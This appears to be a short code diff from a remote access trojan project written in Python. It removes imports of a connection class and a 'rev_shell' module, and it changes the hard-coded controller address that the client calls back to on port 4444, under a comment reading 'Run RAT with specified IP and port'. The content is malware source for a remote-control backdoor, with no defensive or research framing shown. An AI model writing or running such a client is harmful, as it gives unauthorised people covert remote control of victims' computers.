@@ -1,5 +1,3 @@
-from connection import Connection
-from rev_shell import Shell
 import time
 import socket
 import logging
@@ -72,9 +70,7 @@ class Client:
 
 if __name__ == "__main__":
     # Run RAT with specified IP and port
-    Client("192.168.178.70", 4444).run()
-import socket
-import time
+    Client("172.20.10.2", 4444).run()
 
 
 class Connection:
